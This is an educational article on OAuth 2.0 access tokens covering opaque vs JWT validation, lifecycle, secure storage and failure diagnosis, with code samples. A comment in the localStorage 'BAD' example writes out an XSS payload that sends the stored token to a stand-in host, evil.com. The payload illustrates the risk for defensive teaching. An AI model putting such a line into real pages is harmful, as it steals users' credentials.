---
id: OAU-008
title: "Access Token"
category: OAuth 2.0 & OpenID Connect
tier: tier-2-networking-security
folder: OAU-oauth
difficulty: ★☆☆
depends_on: OAU-001, OAU-007
used_by: OAU-009, OAU-010, OAU-015, OAU-016, OAU-023, OAU-024
related: OAU-015, OAU-020, OAU-035
tags:
  - security
  - oauth
  - authorization
  - foundational
  - protocol
status: complete
version: 5
layout: default
parent: "OAuth 2.0 & OpenID Connect"
grand_parent: "Technical Mastery"
nav_order: 8
permalink: /technical-mastery/oauth/access-token/
---

⚡ TL;DR - An access token is the scoped, time-limited credential
that a Client presents to a Resource Server to prove it has the
user's authorization. The Resource Server validates the token and
returns data without ever contacting the user. Tokens come in two
forms: opaque strings (validated via introspection) and JWTs
(validated locally).

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**

Without access tokens, the only way for an application to call an
API on a user's behalf is to present the user's password on every
call. The API must store user credentials, validate them per
request, and has no way to express "only contacts, not email."
Every credential breach exposes user passwords. There is no
mechanism to express time limits or scope.

**THE BREAKING POINT:**

Password-per-request has no revocation mechanism shorter than a
password change. No scoping mechanism. No time limit. No audit
trail that separates "user logged in" from "app made API call."
The access token solves all of these in a single artifact that the
user never creates and the app never stores permanently.

**THE INVENTION MOMENT:**

This is exactly why access tokens exist: a short-lived, scoped,
revocable credential that represents delegated authorization
without carrying the user's actual identity credential.

**EVOLUTION:**

Early OAuth 1.0 tokens were opaque strings that required server-
side lookups for every validation. OAuth 2.0 formalized the token
concept without specifying its format - leaving room for JWTs
(RFC 7519) to emerge as the self-contained alternative. JWT access
tokens are now formalized in RFC 9068 (2021), which specifies
the exact JWT claims an OAuth access token must carry. DPoP (RFC
9449, 2023) adds sender-binding to prevent stolen token reuse.

---

### 📘 Textbook Definition

An access token (RFC 6749 §1.4) is a string representing an
authorization issued to the client. Tokens represent specific
scopes and durations of access granted by the resource owner and
enforced by the resource server and authorization server. The token
is an abstraction layer that replaces different authorization
constructs (e.g., usernames and passwords) with a single token
understood by the resource server. Access tokens may denote an
identifier used to retrieve the authorization information, or
may contain the authorization information in a verifiable manner
(as in JWT format).

---

### ⏱️ Understand It in 30 Seconds

**One line:**
An access token is a temporary permission slip that proves "this
app may do this specific thing for this user until this time."

**One analogy:**

> A museum day pass is an access token: it grants entry to the
> museum (scope), expires at closing time (TTL), is non-transferable
> to other venues (audience), and can be invalidated if reported
> lost (revocation). You show it at the door without the museum
> staff needing to call the ticketing office every time.

**One insight:**
The critical design decision in access tokens is self-containment
vs server-side state. An opaque token requires the Resource Server
to call the Authorization Server for validation (server-side state,
always current). A JWT is self-contained (validated locally, fast)
but revocation is delayed - a revoked JWT stays valid until expiry.
This trade-off drives most production token architecture decisions.

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**

1. An access token proves that the Authorization Server issued it
   (authenticity) and that it has not expired (validity).

2. An access token does NOT prove who the end user is - it proves
   what a client is allowed to do.

3. An access token is scoped - it carries explicit permission
   boundaries, not unlimited access.

**DERIVED DESIGN:**

These three invariants require: a format that can carry scope
and expiry (JWT claims or opaque + introspection), a mechanism
to prove Authorization Server issuance (JWT signature or server-
side lookup), and a deliberate separation from identity tokens
(which carry user identity claims).

Two valid designs emerge from these invariants:

- **Opaque token:** a random string. Validation requires calling
  the Authorization Server's introspection endpoint. Always
  current - revocation is immediate. Expensive at scale.
- **JWT token:** a signed payload with claims. Validated locally
  using the Authorization Server's public key. Fast at scale.
  Revocation is delayed - the JWT is valid until `exp` even if
  revoked at the Authorization Server.

**THE TRADE-OFFS:**

**Gain (JWT):** Local validation at zero Authorization Server load.
Can embed claims (sub, scope, audience) directly.

**Cost (JWT):** Delayed revocation. Every microservice can
independently validate the token - which means they can also
independently mis-validate it if not carefully configured.

**ESSENTIAL vs ACCIDENTAL COMPLEXITY:**

**Essential:** Any delegated credential must carry scope and expiry.
These are irreducible. Authenticity proof (signature or lookup) is
also irreducible.

**Accidental:** The choice between opaque and JWT, the specific
claim names (`scope` vs `scp`), the bearer vs proof-of-possession
semantics - these are implementation decisions that the original
RFC 6749 deliberately left unspecified.

---

### 🧪 Thought Experiment

**SETUP:**

Two Resource Servers handle 10,000 API requests/second each. One
validates access tokens by calling the Authorization Server's
introspection endpoint. The other validates JWTs locally.

**WHAT HAPPENS WITHOUT LOCAL VALIDATION (opaque tokens):**

Each of the 10,000 requests/second triggers one introspection call.
The Authorization Server receives 10,000 introspection requests
per second per Resource Server - 20,000 total. The Authorization
Server becomes the bottleneck for all API traffic. When it has a
60-second maintenance window, both Resource Servers fail 100% of
requests. Introspection adds 20-50ms to every API response.

**WHAT HAPPENS WITH LOCAL VALIDATION (JWT tokens):**

Each Resource Server fetches the Authorization Server's JWKS keys
once (cached for 24 hours). Each of the 10,000 requests validates
the JWT signature locally - zero calls to the Authorization Server
per request. Authorization Server load drops by 99%. A 60-second
maintenance window causes zero API failures. Validation adds
<1ms to each response.

**THE INSIGHT:**

The access token format is an architectural scaling decision
disguised as a credential format choice. JWT enables the
Authorization Server to be an infrequently-called token issuer
rather than a per-request validation bottleneck.

---

### 🧠 Mental Model / Analogy

> An access token is like a signed event ticket. Opaque tokens
> are like tickets that must be scanned against a central database
> at every door (the scanner calls the ticketing office each time).
> JWT tokens are like tickets with holograms: any door scanner can
> verify the hologram locally without calling anyone, but if the
> ticket is reported stolen after issue, the hologram still appears
> valid until the event ends.

- "Event ticket" - the access token string
- "Event organizer's hologram" - the Authorization Server's JWT signature
- "Calling the ticketing office" - token introspection
- "Ticket expiry time" - the `exp` claim
- "Which doors the ticket opens" - the `scope` claim
- "Which venue" - the `aud` (audience) claim
- "Reported stolen but still valid until event ends" - JWT revocation delay

Where this analogy breaks down: tickets cannot be automatically
refreshed when they expire. Access tokens can be silently renewed
using refresh tokens without user interaction.

---

### 📶 Gradual Depth - Five Levels

**Level 1 - What it is (anyone can understand):**
An access token is a string your app includes in API calls to prove
the user said "this app may do this." The API checks the token and
returns data. The token has an expiry time - after that, it stops
working and must be replaced.

**Level 2 - How to use it (junior developer):**
Place the access token in the HTTP `Authorization` header:
`Authorization: Bearer <token>`. Never put it in the URL query
string (it appears in server logs). If the API returns 401, the
token has expired - use the refresh token to get a new one. If it
returns 403, the token does not have the required scope for that
endpoint.

**Level 3 - How it works (mid-level engineer):**
Access tokens are either opaque strings or JWTs. For opaque
tokens, the Resource Server calls the Authorization Server's
`/introspect` endpoint to validate the token and retrieve its
claims. For JWTs, the Resource Server fetches the Authorization
Server's public keys from the JWKS endpoint (cached), verifies
the JWT signature, checks the `exp` claim, validates the `aud`
claim matches the Resource Server's identifier, and extracts the
`scope` claim. Scope is enforced per endpoint.

**Level 4 - Why it was designed this way (senior/staff):**
RFC 6749 deliberately did not specify the access token format.
This was a strategic decision to allow the ecosystem to evolve.
The framework works with any token format that can carry scope and
expiry. JWTs emerged as the dominant format because they enable
stateless validation - critical for microservices. However, the
ambiguity caused years of incompatible implementations. RFC 9068
(2021) finally standardized the JWT access token profile for
OAuth to resolve this interoperability gap.

**Level 5 - Mastery (distinguished engineer):**
The most sophisticated access token decision is token binding vs
bearer semantics. A bearer token (RFC 6750) grants access to any
party that possesses it - possession equals authorization. This is
simple but creates a security risk: a stolen token is a stolen
key. DPoP (RFC 9449) binds the token to the client's cryptographic
key - the token is only usable by the party that holds the
corresponding private key. A stolen DPoP-bound token is useless
without the key. This is the "proof of possession" pattern that
OAuth 1.0 provided with per-request signing, now restored for
OAuth 2.0 in high-security contexts.

---

### ⚙️ How It Works (Mechanism)

**Opaque token validation path:**

```
┌───────────────────────────────────────────────────────┐
│     Access Token Validation: Opaque vs JWT            │
├───────────────────────────────────────────────────────┤
│                                                       │
│  OPAQUE TOKEN PATH:                                   │
│                                                       │
│  Client                 Resource Server    Auth Server│
│    │                         │                  │    │
│    │  GET /api/data           │                  │    │
│    │  Bearer: abc123xyz       │                  │    │
│    │─────────────────────────>│                  │    │
│    │                         │  POST /introspect │    │
│    │                         │  token=abc123xyz  │    │
│    │                         │─────────────────>│    │
│    │                         │<─────────────────│    │
│    │                         │ {active:true,    │    │
│    │                         │  scope:"r:u",    │    │
│    │                         │  exp:1234567890} │    │
│    │<─────────────────────────│                  │    │
│    │  200 + data             │                  │    │
│  Latency: 2 hops + introspection call (~30-80ms)      │
│                                                       │
│  JWT TOKEN PATH:                                      │
│                                                       │
│  Client                 Resource Server    Auth Server│
│    │                         │                  │    │
│    │  GET /api/data           │                  │    │
│    │  Bearer: eyJ...          │                  │    │
│    │─────────────────────────>│                  │    │
│    │                         │ Local validation:│    │
│    │                         │ - verify RS256   │    │
│    │                         │   using cached   │    │
│    │                         │   JWKS public key│    │
│    │                         │ - check exp claim│    │
│    │                         │ - check aud claim│    │
│    │                         │ - check scope    │    │
│    │<─────────────────────────│                  │    │
│    │  200 + data             │                  │    │
│  Latency: 1 hop + crypto (~<1ms per validation)       │
└───────────────────────────────────────────────────────┘
```

```mermaid
flowchart TD
  C[Client] -->|Bearer token| RS[Resource Server]
  RS -->|Opaque token?| INT[POST /introspect]
  RS -->|JWT token?| LOCAL[Local RS256 validation]
  INT --> AS[Authorization Server]
  AS -->|active + claims| RS
  LOCAL --> JWKS[Cached JWKS public key]
  JWKS -->|verify signature| RS
  RS -->|200 + data| C
```

**JWT access token structure (RFC 9068):**

```
┌───────────────────────────────────────────────────────┐
│   JWT Access Token Anatomy (RFC 9068)                 │
├───────────────────────────────────────────────────────┤
│                                                       │
│  Header (base64url-encoded JSON):                     │
│  {                                                    │
│    "alg": "RS256",  // signing algorithm              │
│    "typ": "at+JWT", // RFC 9068: access token type    │
│    "kid": "key-001" // key ID for JWKS lookup         │
│  }                                                    │
│                                                       │
│  Payload (base64url-encoded JSON):                    │
│  {                                                    │
│    "iss": "https://auth.example.com",  // issuer      │
│    "sub": "user-123",    // who owns the delegation   │
│    "aud": "https://api.example.com",  // for who      │
│    "exp": 1716998400,    // expires at (unix)         │
│    "iat": 1716994800,    // issued at                 │
│    "jti": "unique-id",   // JWT ID (for revocation)  │
│    "client_id": "my-app",// which client             │
│    "scope": "read:user email" // what is allowed     │
│  }                                                    │
│                                                       │
│  Signature: RS256(base64(header).base64(payload),     │
│               auth-server-private-key)                │
└───────────────────────────────────────────────────────┘
```

```mermaid
flowchart LR
  H[Header: alg, typ, kid] --> JWT
  P[Payload: iss, sub, aud, exp, scope] --> JWT
  S[Signature: RS256] --> JWT
  JWT --> RS[Resource Server]
  RS --> V1[Verify sig via JWKS]
  RS --> V2[Check exp]
  RS --> V3[Check aud]
  RS --> V4[Check scope]
```

**Bearer token presentation (RFC 6750):**

```
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6ImF0K...

Three valid locations (in priority order):
  1. Authorization header (RECOMMENDED)
     Authorization: Bearer <token>
  2. Form body parameter (POST only, Content-Type:
     application/x-www-form-urlencoded)
     access_token=<token>
  3. URI query parameter (NOT RECOMMENDED - appears in logs)
     GET /resource?access_token=<token>

Use method 1 always. Methods 2 and 3 are for edge cases only.
```

---

### 🔄 The Complete Picture - End-to-End Flow

**NORMAL FLOW:**

```
User approves consent
  → Authorization Server issues access_token [YOU ARE HERE]
  → Client stores token in memory (SPA) or server session
  → Client: GET /api/resource
    Authorization: Bearer <access_token>
  → Resource Server validates token (JWT local or introspect)
  → Resource Server checks scope matches endpoint requirement
  → Resource Server returns 200 + data
```

**FAILURE PATH:**

```
access_token expires (exp claim in past)
  → Resource Server returns 401 {"error":"token_expired"}
  → Client uses refresh_token: POST /token
    grant_type=refresh_token&refresh_token=<token>
  → Authorization Server returns new access_token
  → Client retries original request

access_token has insufficient scope
  → Resource Server returns 403 {"error":"insufficient_scope"}
  → Client must re-authorize with expanded scope
  → Re-authorization requires user interaction
```

**WHAT CHANGES AT SCALE:**

At 100,000+ requests/second, opaque token introspection is
architecturally unsustainable - each request adds a round-trip to
the Authorization Server. JWT tokens shift validation to the
Resource Server: 1ms crypto operation vs 20-80ms network round-
trip. The Authorization Server's load drops from per-request to
per-token-issuance (orders of magnitude fewer operations).

---

### 💻 Code Example

**Example 1 - BAD then GOOD: Bearer token transport:**

```javascript
// BAD: Token in URL query string - appears in server logs,
// browser history, and Referer headers to third parties
async function fetchUserData(token) {
  const response = await fetch(
    // Token in URL - logged everywhere
    `/api/user?access_token=${token}`
  );
  return response.json();
}

// BAD: Token in localStorage - XSS theft vector
function storeToken(token) {
  localStorage.setItem('access_token', token);
  // Any injected script: document.location=
  //   'evil.com?t='+localStorage.getItem('access_token')
}
```

```javascript
// GOOD: Token in Authorization header, stored in memory
// WHY: Authorization header does not appear in server access
//   logs (unlike URL params). Memory storage is cleared on
//   page close, defeating token theft via persistent storage.

let accessToken = null; // in-memory only - not persisted

async function fetchUserData() {
  if (!accessToken) {
    await refreshAccessToken(); // silent refresh
  }
  const response = await fetch('/api/user', {
    headers: {
      // Standard bearer presentation per RFC 6750
      'Authorization': `Bearer ${accessToken}`,
      // Never add token to URL params or body
    }
  });
  if (response.status === 401) {
    // Token expired - refresh and retry once
    await refreshAccessToken();
    return fetchUserData();
  }
  return response.json();
  // WHAT BREAKS: If accessToken is null and no refresh token
  //   exists, the user must re-authorize. Build this state.
  // HOW TO TEST: Set accessToken to null, call fetchUserData,
  //   verify refreshAccessToken is called before the request.
}
```

**Example 2 - JWT token validation on the Resource Server:**

```java
// Resource Server: validate JWT access token
// WHY this shape: validates all RFC 9068 required claims.
// A missing validation is a security vulnerability.
@Component
public class JwtAccessTokenValidator {

  private final JwkSetUriJwtDecoderBuilder jwksBuilder;

  // Spring Security fetches JWKS and caches public keys
  // Keys are refreshed only when an unknown kid is seen
  public JwtAccessTokenValidator(
      @Value("${spring.security.oauth2.resourceserver"
           + ".jwt.jwk-set-uri}") String jwksUri) {
    this.jwksBuilder =
        NimbusJwtDecoder.withJwkSetUri(jwksUri);
  }

  public Jwt validateAndDecode(String token) {
    NimbusJwtDecoder decoder = jwksBuilder.build();

    // Configure all required validations:
    List<OAuth2TokenValidator<Jwt>> validators =
        new ArrayList<>();

    // 1. Signature is verified by NimbusJwtDecoder
    // 2. Expiry validation (exp claim)
    validators.add(new JwtTimestampValidator());
    // 3. Issuer validation (iss claim)
    validators.add(new JwtIssuerValidator(
        "https://auth.example.com"));
    // 4. Audience validation (aud claim)
    validators.add(new JwtClaimValidator<List<String>>(
        "aud",
        aud -> aud.contains("https://api.example.com")
    ));

    decoder.setJwtValidator(
        new DelegatingOAuth2TokenValidator<>(validators));

    return decoder.decode(token);
    // Returns validated Jwt or throws on any failure:
    // - Bad signature → JwtException
    // - Expired → JwtValidationException
    // - Wrong issuer/audience → JwtValidationException

    // WHAT BREAKS: Remove audience validation and a token
    //   issued for service-A is accepted by service-B.
    // HOW TO TEST: Submit a token with aud=other-service;
    //   must return 401, not 200.
    // WHAT CHANGES AT SCALE: JWKS keys are cached in memory
    //   - rotation is handled by kid lookup on unknown key ID.
  }
}
```

**How to test / verify correctness:**
Test all validation paths: (1) expired token → 401,
(2) token with wrong audience → 401, (3) token issued by wrong
issuer → 401, (4) token with insufficient scope → 403,
(5) tampered JWT payload → 401 (signature invalid).
Never trust a token validation implementation that has not been
tested for all five failure modes.

---

### ⚖️ Comparison Table

| Token Format | Validation | Revocation Speed | Latency/Request | Best For |
|---|---|---|---|---|
| **Opaque string** | Introspection call | Immediate | +30-80ms | High-security, small scale |
| **JWT (RS256)** | Local (JWKS cache) | Delayed (until exp) | <1ms | High-scale microservices |
| **JWT + revocation list** | Local + list check | Near-immediate | +2-5ms | High-scale + strict revocation |
| **DPoP-bound JWT** | Local + proof check | Delayed (until exp) | <2ms | High-security + scale |

How to choose: use JWT for microservices where scale matters and
token TTL is short (5-15 minutes, limiting revocation delay). Use
opaque tokens or JWT + revocation list when immediate revocation
is a compliance requirement (financial, healthcare).

---

### 🔁 Flow / Lifecycle

```
┌───────────────────────────────────────────────────────┐
│         Access Token Lifecycle                        │
├───────────────────────────────────────────────────────┤
│                                                       │
│  [Issued] ─────────────────────────────────────────> │
│    - Authorization Server signs JWT                   │
│    - Sets exp = now + 900s (15 min typical)           │
│    - Includes scope, sub, aud, iss claims             │
│                                                       │
│  [Active] ───────────────────────────────────────> │
│    - Client presents in Authorization: Bearer header  │
│    - Resource Server validates each request locally   │
│    - Scope enforced per endpoint                      │
│                                                       │
│  [Expired] (exp in past) ─────────────────────────> │
│    - Resource Server returns 401 token_expired        │
│    - Client uses refresh_token to get new token       │
│    - Refresh token not expired → new access token     │
│    - Refresh token expired → re-authorization needed  │
│                                                       │
│  [Revoked] (before exp) ──────────────────────────> │
│    - Authorization Server marks jti in revocation DB  │
│    - Opaque: introspection returns active: false      │
│    - JWT: revocation delayed until exp (unless RS     │
│      checks revocation list)                         │
└───────────────────────────────────────────────────────┘
```

```mermaid
stateDiagram-v2
  [*] --> Issued: Auth Server signs token
  Issued --> Active: Client presents token
  Active --> Active: Resource Server validates
  Active --> Expired: exp claim in past
  Expired --> Refreshed: Client uses refresh_token
  Refreshed --> Active: New access_token issued
  Expired --> Unauthorized: No refresh token
  Active --> Revoked: User revokes access
  Revoked --> Expired: Still valid until exp (JWT)
  Unauthorized --> [*]
  Revoked --> [*]
```

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|---|---|
| The access token identifies the user | The access token identifies the delegation (what a client may do). The `sub` claim identifies the resource owner, but the access token is not an identity assertion - that is the ID token's job. |
| JWT access tokens are always more secure | JWTs are faster but have delayed revocation. Opaque tokens support immediate revocation. The right choice depends on revocation requirements, not a general security ranking. |
| Long-lived access tokens are more convenient and acceptable | Long-lived tokens exponentially increase the blast radius of token theft. Use short-lived tokens (5-15 minutes) and refresh tokens for longevity. |
| Token validation is the same as token authentication | Validation checks that the Authorization Server issued the token correctly. Authentication identifies the user. A valid token does not mean the user is currently authenticated - it means the user authorized this delegation at some point in the past. |
| You can always revoke a JWT immediately | JWT tokens carry their own validity information. Without a revocation list or short TTL, a revoked JWT remains valid at any Resource Server that validates locally. |

---

### 🚨 Failure Modes & Diagnosis

**Token Stored in localStorage (XSS theft vector)**

**Symptom:**
During a security audit, penetration testers inject JavaScript
that exfiltrates access tokens. Post-incident analysis shows
tokens stored in `localStorage` were stolen. Users report
unauthorized activity on their accounts.

**Root Cause:**
`localStorage` is readable by any JavaScript executing on the page,
including injected scripts from XSS attacks. An access token in
localStorage is a persistent credential that survives page refresh
and tab closure, giving attackers a long window to exploit it.

**Diagnostic Command / Tool:**

```javascript
// Test: can injected script access the token?
// Paste this in browser console - if it returns a token,
// localStorage storage is insecure:
console.log(localStorage.getItem('access_token'));
// Any non-null result = token exposed to XSS

// Automated: OWASP ZAP or Burp Suite XSS scan
// will test whether stored tokens are accessible
```

**Fix:**

```javascript
// BAD: Persistent localStorage storage
localStorage.setItem('access_token', token);

// GOOD: Memory-only storage for access tokens
// Refresh token in httpOnly cookie (JS cannot read)
// Access token in JavaScript memory (cleared on unload)
class TokenStore {
  #accessToken = null; // private field, not in storage

  set(token) { this.#accessToken = token; }
  get() { return this.#accessToken; }
  clear() { this.#accessToken = null; }
}
// For persistence across page loads: refresh token in
// httpOnly cookie, access token fetched fresh each load
```

**Prevention:**
Never store access tokens in `localStorage` or `sessionStorage`.
Use memory for SPAs. For persistence, store only the refresh token
in an `httpOnly; Secure; SameSite=Strict` cookie.

---

**Missing Audience Validation (Token Confusion Attack)**

**Symptom:**
A token issued for Service A is accepted by Service B. An attacker
who obtains a low-privilege token for one service can use it to
call higher-privilege endpoints on a different service in the same
organization.

**Root Cause:**
The Resource Server validates the JWT signature and expiry but
does not check the `aud` (audience) claim. Every service in the
organization uses tokens from the same Authorization Server, so
the signature is valid everywhere - only the audience claim
distinguishes "for which service."

**Diagnostic Command / Tool:**

```bash
# Decode JWT and check aud claim:
TOKEN="eyJ..."
echo $TOKEN | cut -d. -f2 \
  | base64 --decode 2>/dev/null \
  | python3 -m json.tool | grep '"aud"'

# Test: submit service-A token to service-B:
curl -H "Authorization: Bearer $SERVICE_A_TOKEN" \
     https://service-b.example.com/api/resource
# CORRECT: 401 invalid_token (wrong audience)
# VULNERABLE: 200 with data
```

**Fix:**
Add audience validation to every JWT validation configuration.
Each Resource Server must know its own audience identifier and
reject tokens with a different `aud` value.

**Prevention:**
Make audience validation a mandatory deployment checklist item.
Each service has a unique audience string registered with the
Authorization Server. Token requests must specify the target
audience.

---

**Insufficient Token TTL (Large Revocation Window)**

**Symptom:**
A user reports unauthorized activity hours after revoking an
app's access. Investigation shows JWT tokens with 24-hour TTL
are still being used after revocation.

**Root Cause:**
Long-lived JWT tokens remain valid at all Resource Servers until
they expire, even after revocation at the Authorization Server.
Without a revocation list, there is no mechanism to invalidate
a JWT before its `exp` time.

**Diagnostic Command / Tool:**

```bash
# Decode token to check TTL (exp - iat):
TOKEN="eyJ..."
python3 -c "
import base64, json, sys
payload = sys.argv[1].split('.')[1]
padding = 4 - len(payload) % 4
data = json.loads(
    base64.urlsafe_b64decode(payload + '='*padding))
ttl = data['exp'] - data['iat']
print(f'TTL: {ttl}s ({ttl/3600:.1f}h)')
" "$TOKEN"
# TTL > 900s (15 min) is a long-lived token risk
```

**Fix:**
Reduce access token TTL to 5-15 minutes. Pair with refresh tokens
for user experience. For sensitive operations (financial, medical),
add a revocation list check even for JWT tokens.

**Prevention:**
Set access token TTL as a security parameter, not a convenience
parameter. Short TTL limits the revocation window. Refresh tokens
handle the user experience of staying logged in.

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**

- `OAuth 2.0 Roles` - the four actors that issue, hold, and
  validate access tokens
- `The Delegation Problem - Why OAuth Exists` - why access tokens
  exist as a concept

**Builds On This (learn these next):**

- `Bearer Token` - the HTTP presentation standard for access tokens
- `Token Response Structure` - the JSON envelope containing the
  access token from the Authorization Server
- `JWT Access Tokens (RFC 9068)` - the standardized JWT profile
  for OAuth 2.0 access tokens
- `Token Validation` - the full validation algorithm for JWT and
  opaque access tokens

**Alternatives / Comparisons:**

- `Refresh Token` - the long-lived companion credential used to
  obtain new access tokens without user re-authorization
- `Proof of Possession Tokens - DPoP` - access tokens bound to
  the client's cryptographic key; resists stolen-token attacks
- `Token Introspection (RFC 7662)` - the mechanism for validating
  opaque access tokens at the Authorization Server

---

### 📌 Quick Reference Card

```
┌──────────────────────────────────────────────────────────┐
│ WHAT IT IS   │ Short-lived scoped credential for API     │
│              │ access delegated by the Resource Owner    │
├──────────────┼───────────────────────────────────────────┤
│ PROBLEM IT   │ Password-per-request: no scope, no expiry,│
│ SOLVES       │ no revocation mechanism                   │
├──────────────┼───────────────────────────────────────────┤
│ KEY INSIGHT  │ Opaque=immediate revocation; JWT=fast     │
│              │ validation. Choose based on revocation    │
│              │ requirements, not security ranking        │
├──────────────┼───────────────────────────────────────────┤
│ USE WHEN     │ Client needs delegated API access on      │
│              │ behalf of a Resource Owner                │
├──────────────┼───────────────────────────────────────────┤
│ AVOID WHEN   │ N/A - access tokens are mandatory in      │
│              │ every OAuth flow (they are the output)    │
├──────────────┼───────────────────────────────────────────┤
│ ANTI-PATTERN │ Storing access tokens in localStorage -   │
│              │ readable by XSS-injected scripts          │
├──────────────┼───────────────────────────────────────────┤
│ TRADE-OFF    │ JWT local validation (fast, scale) vs     │
│              │ immediate revocation (introspection)      │
├──────────────┼───────────────────────────────────────────┤
│ ONE-LINER    │ "A token proves delegation, not identity; │
│              │  short TTL is security, not convenience"  │
├──────────────┼───────────────────────────────────────────┤
│ NEXT EXPLORE │ Bearer Token → Token Validation →         │
│              │ JWT Access Tokens (RFC 9068)              │
└──────────────────────────────────────────────────────────┘
```

**If you remember only 3 things:**

1. Access tokens prove delegation (what a client may do), not
   identity (who the user is). Use ID tokens for identity.

2. JWT tokens validate locally (fast, scales) but revocation is
   delayed. Opaque tokens validate via introspection (slower)
   but revoke immediately. Choose based on your requirements.

3. Never store access tokens in localStorage. Use memory for SPAs,
   short TTL for tokens, and refresh tokens in httpOnly cookies
   for persistence.

**Interview one-liner:**
"An access token is a scoped, time-limited credential issued by
the Authorization Server that proves the user authorized this
client to perform specific operations. JWT format enables local
validation at scale; opaque format enables immediate revocation.
Short TTL is the primary security lever."

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
Credentials should be scoped to minimum privilege, time-limited to
minimum necessary duration, and designed for revocability. A
credential that grants more than needed, lasts longer than needed,
or cannot be revoked is a liability that grows with time. This
principle governs API keys, database credentials, cloud IAM roles,
and SSH keys - not just OAuth tokens.

**Where else this pattern appears:**

- **AWS IAM temporary credentials** - STS-issued credentials with
  role, expiry, and revocability mirror OAuth access tokens exactly
- **Kerberos service tickets** - time-limited, service-scoped
  credentials with the same TTL + revocation trade-offs
- **SSH certificates** - unlike long-lived SSH keys, certificates
  carry expiry and principal constraints; the same token pattern
  applied to SSH access

**Industry applications:**

- **Healthcare (SMART on FHIR)** - access tokens are scoped to
  specific patient data (e.g., `patient/Observation.read`) and
  short-lived; the TTL prevents stale tokens being used after
  a clinical context ends
- **Financial services (Open Banking)** - access tokens for
  payment initiation carry explicit operation scope; a token
  for "view balance" cannot be used for "initiate payment"

---

### 💡 The Surprising Truth

RFC 6749 defines the access token concept in Section 1.4 but
deliberately does NOT define the token format. The spec says
only that a token is "a string representing an authorization" -
nothing about JWT, nothing about opaque strings. This was an
intentional design choice by the OAuth working group to avoid
overspecification. The result: for the first eight years after
RFC 6749 was published in 2012, every OAuth 2.0 provider used
a slightly different JWT claim structure, making tokens non-
portable across providers. RFC 9068 (published in October 2021 -
nine years later) finally standardized the JWT access token
profile. Intentional underspecification solved a short-term
adoption problem and created a decade of interoperability
fragmentation.

---

### ✅ Mastery Checklist

**You've mastered this when you can:**

1. **[EXPLAIN]** Explain to a developer why storing access tokens
   in `localStorage` is a security vulnerability and describe
   the correct storage strategy for both SPAs and server-side
   applications.

2. **[DEBUG]** A Resource Server is accepting tokens that were
   revoked 30 minutes ago. Diagnose whether this is a JWT TTL
   issue, a missing revocation list check, or a caching problem,
   and describe the diagnostic steps.

3. **[DECIDE]** You are building a financial API that requires
   immediate revocation when a user disconnects an app. Choose
   between JWT and opaque tokens and justify the decision with
   specific reference to the revocation latency trade-off.

4. **[BUILD]** Implement JWT access token validation in your
   language of choice, covering all five required checks:
   signature, expiry, issuer, audience, and scope per endpoint.

5. **[EXTEND]** Design a token validation strategy for 30
   microservices that achieves <2ms validation latency while
   ensuring revoked tokens are invalidated within 60 seconds.
   Describe which mechanisms you combine and why.

---

### 🧠 Think About This Before We Continue

**Q1.** Your application issues JWT access tokens with a 1-hour
TTL. A user account is compromised and you need to revoke all
tokens for that user immediately. What are the two architectural
options, what does each cost, and which would you implement for a
payments API versus a social media API?

*Hint: Think about the revocation list approach and the
short-TTL approach. Consider what "immediate" means in each
case and what operational cost each adds to every API request.*

**Q2.** At 500,000 API requests per second across 20 microservices,
your team wants to switch from JWT tokens to opaque tokens for
stricter revocation control. Model the Authorization Server load
that results and design the caching strategy that makes it
operationally viable.

*Hint: 500,000 requests/second × 1 introspection call each =
500,000 introspection calls/second. Consider token caching at
each Resource Server with appropriate invalidation strategy.*

**Q3.** Build a minimal token validation middleware that checks all
five JWT claims (signature, exp, iss, aud, scope) and returns
structured error responses distinguishing between expired tokens
(the client should refresh) and invalid tokens (the client should
re-authorize). What HTTP status codes and error bodies does each
failure produce?

*Hint: RFC 6750 defines the error response format including
WWW-Authenticate header with error_description. Distinguish
between 401 (token problem, recoverable) and 403 (scope
problem, not recoverable without re-auth).*

---

### 🎯 Interview Deep-Dive

**Q1: Explain the trade-off between JWT and opaque access tokens
and when you would choose each.**

*Why they ask:* Tests understanding of the fundamental token
architecture decision in OAuth 2.0 systems.

*Strong answer includes:*

- JWT: self-contained, locally validated, zero Authorization
  Server calls per request; trade-off = delayed revocation
  (token valid until exp even after revocation)
- Opaque: server-side state, immediate revocation; trade-off =
  introspection call per request, Authorization Server becomes
  a bottleneck at scale
- Choose JWT for microservices with short TTL (5-15 min, limits
  revocation window) and for high-throughput APIs
- Choose opaque (or JWT + revocation list) for financial/
  healthcare where immediate revocation is a compliance requirement

**Q2: A JWT access token with a 24-hour TTL was stolen. The user
revokes access. What happens and how would you have prevented it?**

*Why they ask:* Tests understanding of JWT revocation limitations
and production security design.

*Strong answer includes:*

- The revoked JWT remains valid at all Resource Servers for up
  to 24 hours (they validate locally, zero calls to AS)
- Prevention 1: short TTL (15 minutes) - limits the window
- Prevention 2: revocation list at Resource Server (check jti
  claim against a distributed list - adds latency but limits
  window to seconds)
- Prevention 3: DPoP binding - stolen JWT unusable without the
  client's private key
- Production design: short TTL + refresh tokens + revocation
  list for high-security operations only

**Q3: Walk through the full JWT access token validation steps
a Resource Server must perform on every request.**

*Why they ask:* Tests whether the candidate knows token
validation as a security responsibility, not just a checkbox.

*Strong answer includes:*

- Extract token from Authorization: Bearer header
- Verify JWT structure (3 dot-separated base64url segments)
- Look up `kid` in cached JWKS; fetch fresh keys if unknown
- Verify RS256 (or ES256) signature against public key
- Check `exp` claim: token must not be expired
- Check `iss` claim: must match known Authorization Server URL
- Check `aud` claim: must contain THIS Resource Server's identifier
- Check required scope for the specific endpoint being called
- Optionally check `jti` against revocation list
- Return 401 for any cryptographic failure; 403 for scope failure
